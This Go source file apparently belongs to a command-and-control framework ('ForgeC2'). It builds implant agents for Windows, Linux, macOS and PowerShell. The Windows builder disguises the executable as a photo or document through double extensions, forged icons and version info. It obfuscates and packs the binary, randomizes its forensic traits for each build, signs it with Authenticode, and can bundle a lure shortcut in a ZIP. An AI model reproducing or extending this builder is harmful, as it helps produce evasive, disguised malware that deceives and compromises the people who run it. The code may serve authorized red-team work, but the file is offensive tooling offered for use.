package payload

import (
	"archive/zip"
	"bytes"
	"debug/pe"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
)

// GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := ValidateImplantBuild("windows", "exe", &cfg); err != nil {
		return "", err
	}
	plan, err := resolveAgentPlan(&cfg)
	if err != nil {
		return "", err
	}

	// Create temp build dir
	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Make outputDir absolute to avoid issues with cmd.Dir
	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}

	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
		return "", err
	}

	// Reuse the repository module graph when available; this avoids a network
	// dependent `go mod tidy` for every build and keeps agent dependencies
	// aligned with the server's pinned versions.
	if err := prepareAgentModule(goCmd, tmpDir, "windows", false, plan, cfg.Win7Compat); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")

	// Output filename — honor disguise: photo.jpg.exe / doc.pdf.exe / ...
	outName := cfg.Filename
	if outName == "" {
		// Empty form values are legal; never let two concurrent builds share a
		// default output path.
		outName = uniqueBuildName("forgec2_agent", ".exe")
	}
	// Disguise filename via the shared helper (single source of truth).
	outName = ApplyDisguiseFilename(outName, cfg.DisguiseAs)
	// Strip any directory components so a user-supplied filename containing
	// ".." or an absolute path cannot write outside outputDir (A1).
	outName = safeBuildFileName(outName)

	// Windows icon / disguise handling (must be before go mod tidy so rsrc.syso
	// is in tmpDir). A requested icon/preset/disguise that cannot be embedded
	// is a build failure: silently shipping the default Go icon would defeat
	// the operator's explicit choice.
	resourceName := cfg.OriginalFilename
	if resourceName == "" {
		if cfg.Filename == "" {
			// Direct generator callers that let the server pick an output name
			// must not leak the internal build name into VersionInfo.
			resourceName = "agent.exe"
		} else {
			resourceName = outName
		}
	}
	if err := injectIconResource(tmpDir, cfg, resourceName); err != nil {
		return "", fmt.Errorf("resource injection failed: %w", err)
	}

	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
	if err != nil {
		return "", err
	}
	defer os.Remove(buildPath)

	goarch, err := resolveBuildArch("windows", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.SelfCheck, cfg.Win7Compat); err != nil {
		return "", err
	}

	// Post-build: full per-build PE forensic randomization (must run before
	// self-check patch so the hash covers final bytes).
	if err := finalizePE(buildPath, cfg, goarch); err != nil {
		return "", err
	}

	// Optional UPX compression (also before the self-check patch).
	if err := maybeCompressUPX(buildPath, cfg, "exe"); err != nil {
		return "", err
	}

	// Self-integrity: embed the SHA-256 of the finalized binary (must run after
	// stripping so the hash matches what the agent reads at runtime). For PE
	// this also pads the image to 8 bytes, so the later certificate table does
	// not introduce bytes the digest never covered.
	if cfg.SelfCheck {
		if err := patchSelfCheckHash(buildPath); err != nil {
			return "", err
		}
	}

	// Authenticode signing runs on the final bytes: after UPX (which rewrites
	// the image) and after self-check (whose PE-aware digest ignores the
	// checksum, security directory and certificate table that signing changes).
	// Validation below therefore covers exactly what is delivered.
	if err := signPEIfRequested(buildPath, cfg); err != nil {
		return "", err
	}

	// Fail loudly (rather than deliver a corrupt binary) if the produced exe is
	// malformed, is not a GUI executable, still carries a debug directory, or
	// is the wrong architecture.
	if err := validatePEWith(buildPath, peExpect{
		Machine:             windowsMachine(goarch),
		Signed:              cfg.CodeSigningEnabled(),
		RequireDebugCleared: true,
		Subsystem:           pe.IMAGE_SUBSYSTEM_WINDOWS_GUI,
	}); err != nil {
		return "", fmt.Errorf("generated exe failed PE validation: %w", err)
	}

	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
		return "", err
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}
	// Optional LNK shortcut alongside the exe — bundle as ZIP for single download
	if cfg.LNKDisguise {
		exeName := filepath.Base(outPath)
		lnkName := strings.TrimSuffix(exeName, ".exe")
		lnkName = strings.TrimSuffix(lnkName, ".EXE") + ".lnk"
		lnkPath := filepath.Join(outputDir, lnkName)
		// A requested LNK delivery must not silently degrade to a bare EXE:
		// the operator (and the download UI) expects a single .zip bundle, so
		// every bundling failure is reported and its partial files removed.
		lnkData, err := BuildLnkForExeWithIcon(exeName, DisguiseLnkIcon(cfg.DisguiseAs, exeName))
		if err != nil {
			return "", fmt.Errorf("lnk bundle: create shortcut: %w", err)
		}
		if err := os.WriteFile(lnkPath, lnkData, 0600); err != nil {
			return "", fmt.Errorf("lnk bundle: write shortcut: %w", err)
		}
		zipName := strings.TrimSuffix(exeName, ".exe")
		zipName = strings.TrimSuffix(zipName, ".EXE") + ".zip"
		zipPath := filepath.Join(outputDir, zipName)
		zf, err := os.Create(zipPath)
		if err != nil {
			_ = os.Remove(lnkPath)
			return "", fmt.Errorf("lnk bundle: create zip: %w", err)
		}
		// cleanupFail removes the partially written zip and the loose LNK so a
		// failed bundle cannot leave build material behind.
		cleanupFail := func(err error) (string, error) {
			_ = zf.Close()
			_ = os.Remove(zipPath)
			_ = os.Remove(lnkPath)
			return "", fmt.Errorf("lnk bundle: %w", err)
		}
		zw := zip.NewWriter(zf)
		for _, p := range []string{outPath, lnkPath} {
			b, err := os.ReadFile(p)
			if err != nil {
				return cleanupFail(fmt.Errorf("read %s: %w", p, err))
			}
			w, err := zw.Create(filepath.Base(p))
			if err != nil {
				return cleanupFail(fmt.Errorf("zip entry %s: %w", p, err))
			}
			if _, err := w.Write(b); err != nil {
				return cleanupFail(fmt.Errorf("zip write %s: %w", p, err))
			}
		}
		if err := zw.Close(); err != nil {
			return cleanupFail(fmt.Errorf("zip close: %w", err))
		}
		if err := zf.Close(); err != nil {
			_ = os.Remove(zipPath)
			_ = os.Remove(lnkPath)
			return "", fmt.Errorf("lnk bundle: file close: %w", err)
		}
		// The ZIP is the single downloadable artifact. Remove the loose
		// EXE/LNK so build-job cleanup does not leave orphans behind.
		_ = os.Remove(outPath)
		_ = os.Remove(lnkPath)
		// Prefer returning ZIP when LNK is requested so BuildDownload serves both
		return zipPath, nil
	}

	return outPath, nil
}

// GeneratePowerShellSource returns the complete PowerShell agent source code
// after executing the external template. This is the single source of truth.
func GeneratePowerShellSource(cfg ImplantConfig, dataDir string) (string, error) {
	NormalizeImplantConfig(&cfg, dataDir)

	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
	if err != nil {
		return "", fmt.Errorf("powershell template not found in embed: %w", err)
	}

	tmpl, err := template.New("ps1").Funcs(template.FuncMap{"ps": psEscape}).Parse(string(tmplContent))
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, cfg); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
// Internally uses the full template.
func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
	ps1Code, err := GeneratePowerShellSource(cfg, filepath.Dir(outputDir))
	if err != nil {
		return "", err
	}

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.ps1"
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0750); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(ps1Code), 0600); err != nil {
		return "", err
	}
	return outPath, nil
}

// GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := ValidateImplantBuild("linux", "elf", &cfg); err != nil {
		return "", err
	}
	plan, err := resolveAgentPlan(&cfg)
	if err != nil {
		return "", err
	}
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-linux-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}

	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
		return "", err
	}

	if err := prepareAgentModule(goCmd, tmpDir, "linux", false, plan, cfg.Win7Compat); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "linux")

	outName := cfg.Filename
	if outName == "" {
		outName = uniqueBuildName("forgec2_agent", "")
	}
	// Linux binaries typically have no .exe
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outName = safeBuildFileName(outName)
	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
	if err != nil {
		return "", err
	}
	defer os.Remove(buildPath)

	goarch, err := resolveBuildArch("linux", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "linux", goarch, blob, sKey, cfg.SelfCheck, cfg.Win7Compat); err != nil {
		return "", err
	}

	// Optional UPX compression (before the self-check patch below).
	if err := maybeCompressUPX(buildPath, cfg, "elf"); err != nil {
		return "", err
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(buildPath); err != nil {
			return "", err
		}
	}

	// Validate the final bytes (after UPX/self-check mutation) and reject a
	// wrong-architecture or malformed ELF before publishing it.
	if err := validateELF(buildPath, goarch); err != nil {
		return "", fmt.Errorf("generated elf failed ELF validation: %w", err)
	}

	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
		return "", err
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// GenerateMacOS builds a macOS agent binary via cross-compilation.
func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := ValidateImplantBuild("darwin", "macho", &cfg); err != nil {
		return "", err
	}
	plan, err := resolveAgentPlan(&cfg)
	if err != nil {
		return "", err
	}
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}

	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
		return "", err
	}

	if err := prepareAgentModule(goCmd, tmpDir, "darwin", false, plan, cfg.Win7Compat); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "darwin")

	outName := cfg.Filename
	if outName == "" {
		outName = uniqueBuildName("forgec2_agent", "")
	}
	outName = safeBuildFileName(outName)
	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
	if err != nil {
		return "", err
	}
	defer os.Remove(buildPath)

	goarch, err := resolveBuildArch("darwin", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "darwin", goarch, blob, sKey, cfg.SelfCheck, cfg.Win7Compat); err != nil {
		return "", err
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(buildPath); err != nil {
			return "", err
		}
	}
	if err := validateMachO(buildPath, goarch); err != nil {
		return "", fmt.Errorf("generated mach-o failed validation: %w", err)
	}

	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
		return "", err
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF + macOS).
// The PS1 template lives in powershell_template.ps1 as the canonical implementation.
